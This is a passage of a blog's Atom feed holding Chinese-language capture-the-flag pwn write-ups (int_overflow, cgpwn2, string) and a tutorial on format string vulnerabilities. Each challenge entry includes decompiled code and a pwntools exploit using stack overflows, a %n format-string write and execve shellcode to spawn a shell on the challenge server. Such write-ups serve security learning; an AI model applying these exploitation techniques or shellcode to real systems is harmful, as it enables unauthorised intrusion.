<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xfgg</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-27T07:37:47.231Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>int_overflow</title>
    <link href="http://yoursite.com/2019/07/27/int_overflow/"/>
    <id>http://yoursite.com/2019/07/27/int_overflow/</id>
    <published>2019-07-27T07:04:06.396Z</published>
    <updated>2019-07-27T07:37:47.231Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec int_overflow</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/int_overflow'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只开启了nx保护</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow1.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部，</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow2.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = strlen(s);造成整数溢出的一个点，我们再看一下此处的汇编代码。</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow3.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。 再加上四字节就可以溢出</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们需要进到<span class="keyword">else</span>里，将 <span class="built_in">read</span> 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。</span><br><span class="line">现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈溢出漏洞 加一个整数漏洞</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,44825)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">sys_addr = 0x0804868b</span><br><span class="line">payload = <span class="string">'a'</span>*0x14+<span class="string">'a'</span>*4+p32(sys_addr)</span><br><span class="line">payload = payload.ljust(259,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>cgpwn2</title>
    <link href="http://yoursite.com/2019/07/27/cgpwn2/"/>
    <id>http://yoursite.com/2019/07/27/cgpwn2/</id>
    <published>2019-07-27T06:48:01.768Z</published>
    <updated>2019-07-27T07:02:13.784Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec cgpwn2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/cgpwn2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">   只开启了nx保护</span><br><span class="line"></span><br><span class="line"> ida分析</span><br><span class="line"> char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax</span><br><span class="line">  signed int v1; // ebx</span><br><span class="line">  unsigned int v2; // ecx</span><br><span class="line">  char *v3; // eax</span><br><span class="line">  char s; // [esp+12h] [ebp-26h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-24h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = 30;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(<span class="string">"please tell me your name"</span>);</span><br><span class="line">  fgets(name, 50, stdin);</span><br><span class="line">  puts(<span class="string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fgets(name, 50, stdin); 栈溢出漏洞</span><br><span class="line"></span><br><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line"></span><br><span class="line">name 在bss段可以写入/bin/sh</span><br><span class="line"></span><br><span class="line">int pwn()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"echo hehehe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有system但是没有/bin/sh 需要自己写入</span><br><span class="line"></span><br><span class="line">00000026 s               db ?</span><br><span class="line">-00000025                 db ? ; undefined</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">.................</span><br><span class="line">00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">溢出字节位42字节</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。</span><br><span class="line"></span><br><span class="line">将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通的栈溢出攻击 有system但是没有/bin/sh</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,48164)</span><br><span class="line">bin_sh_addr=0x0804A080</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">system_addr=0x08048420</span><br><span class="line">payload=<span class="string">'a'</span>*0x26+<span class="string">'a'</span>*4+p32(system_addr)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="http://yoursite.com/2019/07/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6/"/>
    <id>http://yoursite.com/2019/07/27/格式化字符/</id>
    <published>2019-07-27T06:44:31.439Z</published>
    <updated>2019-07-27T06:44:15.991Z</updated>
    
    <content type="html"><![CDATA[<h3 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是<span class="built_in">printf</span>、sprintf、fprintf等<span class="built_in">print</span>家族函数。介绍格式化字符串原理的文章有很多，我这里就以<span class="built_in">printf</span>函数为例，简单回顾其中的要点。</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>()函数的一般形式为<span class="built_in">printf</span>(<span class="string">"format"</span>, 输出表列)，其第一个参数就是格式化字符串，用来告诉程序以什么格式进行输出。正常情况下，我们是这样使用的：</span><br><span class="line"></span><br><span class="line">char str[100];</span><br><span class="line">scanf(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">但也会有人这么用：</span><br><span class="line"></span><br><span class="line">char str[100];</span><br><span class="line">scanf(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br><span class="line">也许代码编写者的本意只是单纯打印一段字符（如“hello world”），但如果这段字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式化字符（如%s）。那么，由于<span class="built_in">printf</span>允许参数个数不固定，故<span class="built_in">printf</span>会自动将这段字符当作format参数，而用其后内存中的数据匹配format参数。</span><br></pre></td></tr></table></figure><p><img src="http://p2.qhimg.com/t0199b46dc9f9480f6f.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">以上图为例，假设调用<span class="built_in">printf</span>(str)时的栈是这样的。</span><br><span class="line"></span><br><span class="line">1）如str就是“hello world”，则直接输出“hello world”；</span><br><span class="line"></span><br><span class="line">2）如str是format，比如是%2<span class="variable">$x</span>，则输出偏移2处的16进制数据0xdeadbeef。</span><br><span class="line"></span><br><span class="line">通过组合变换格式化字符串参数，我们可以读取任意偏移处的数据或向任意偏移处写数据，从而达到利用格式化字符串漏洞的作用。</span><br></pre></td></tr></table></figure><h3 id="基本的格式化字符串参数"><a href="#基本的格式化字符串参数" class="headerlink" title="基本的格式化字符串参数"></a>基本的格式化字符串参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i<span class="variable">$x</span>表示要泄漏偏移i处4字节长的16进制数据，%i<span class="variable">$lx</span>表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i<span class="variable">$s</span>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前<span class="built_in">printf</span>已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10<span class="variable">$n</span>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%<span class="variable">$hn</span>表示写入的地址空间为2字节，%<span class="variable">$hhn</span>表示写入的地址空间为1字节，%<span class="variable">$lln</span>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%<span class="variable">$hn</span>或%<span class="variable">$hhn</span>来适时调整。</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</span><br><span class="line"></span><br><span class="line">原文链接：https://www.anquanke.com/post/id/85785</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;格式化字符串漏洞基本原理&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞基本原理&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞基本原理&quot;&gt;&lt;/a&gt;格式化字符串漏洞基本原理&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>string</title>
    <link href="http://yoursite.com/2019/07/27/string/"/>
    <id>http://yoursite.com/2019/07/27/string/</id>
    <published>2019-07-27T06:23:40.598Z</published>
    <updated>2019-07-27T06:37:29.391Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec string</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/string'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">除了PIE，其他保护全开</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line">unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(<span class="string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span>);</span><br><span class="line">  puts(<span class="string">"Dragon say: HaHa! you were supposed to have a normal"</span>);</span><br><span class="line">  puts(<span class="string">"RPG game, but I have changed it! you have no weapon and "</span>);</span><br><span class="line">  puts(<span class="string">"skill! you could not defeat me !"</span>);</span><br><span class="line">  puts(<span class="string">"That's sound terrible! you meet final boss!but you level is ONE!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    <span class="built_in">read</span>(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> __readfsqword(0x28u) ^ v3;</span><br><span class="line"></span><br><span class="line">((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这句话的意思是：把v1强制转化成一个函数指针，然后调用这个函数。也就是说如果我们shellcode写到这个位置，就能直接调用。shellcode可以通过上面的<span class="built_in">read</span>函数来写进去。</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"A voice heard in your mind"</span>);</span><br><span class="line">    puts(<span class="string">"'Give me an address'"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">    puts(<span class="string">"And, you wish is:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;format);</span><br><span class="line">    puts(<span class="string">"Your wish is"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">    puts(<span class="string">"I hear it, I hear it...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  第二：需要让*a1 == a1[1]。a1是作为参数传进来的，通过回溯，我们发现 a1 就是在 main 函数中 定义的v3，是一个指向堆块的指针。其中v3[0]=68,v3[1]=85。也就是说当v3[0]==v3[1]时就能满足*a1 == a1[1]。利用格式化字符串漏洞可以修改</span><br><span class="line"></span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = 68;</span><br><span class="line">  v3[1] = 85;</span><br><span class="line">  puts(<span class="string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span>);</span><br><span class="line">  puts(<span class="string">"we will tell you two secret ..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[1] is %x\n"</span>, v4 + 4);</span><br><span class="line">  puts(<span class="string">"do not tell anyone "</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  puts(<span class="string">"The End.....Really?"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);secret[0] 就是 我们需要的地址。</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现在 地址有了，利用格式化字符串 将 *a1 == a1[1]，成功进入脆弱点，写入shellcode。</span><br><span class="line">这道题有一点需要注意，这是一个64位的程序，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。</span><br><span class="line"></span><br><span class="line">在输入address的时候，输入1234，并在 <span class="built_in">printf</span>(&amp;format, &amp;format)前下一个断点，查看我们输入的地址在栈中的位置：</span><br><span class="line">(gdb) x/10gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd5e8:0x00007ffff7a711480x00007ffff7dcfa00</span><br><span class="line">0x7fffffffd5f8:0x00007ffff7dcc2a00x0000000000000000</span><br><span class="line">0x7fffffffd608:0x00000000000000730x00007ffff7dcfa00</span><br><span class="line">0x7fffffffd618:0x00007ffff7a723f20x0000000000000000</span><br><span class="line">0x7fffffffd628:0x00007ffff7dd05600x00007fffffffdd20</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞请看另一篇文章。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("/home/xfgg/Downloads/string")</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,34288)</span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">n = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="built_in">print</span> n[:-1]</span><br><span class="line"><span class="built_in">print</span> int(n[:-1],16)</span><br><span class="line">addrs = int(n[:-1],16)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"addrs: "</span> + hex(addrs)</span><br><span class="line">p.recvuntil(<span class="string">'name be:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"susan"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'or up?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'\n"</span>)</span><br><span class="line">p.sendline(str(addrs))</span><br><span class="line">p.recvuntil(<span class="string">'you wish is:\n'</span>)</span><br><span class="line">payload = <span class="string">"%85c"</span> + <span class="string">"%7<span class="variable">$n</span>"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'USE YOU SPELL\n'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rand和srand函数</title>
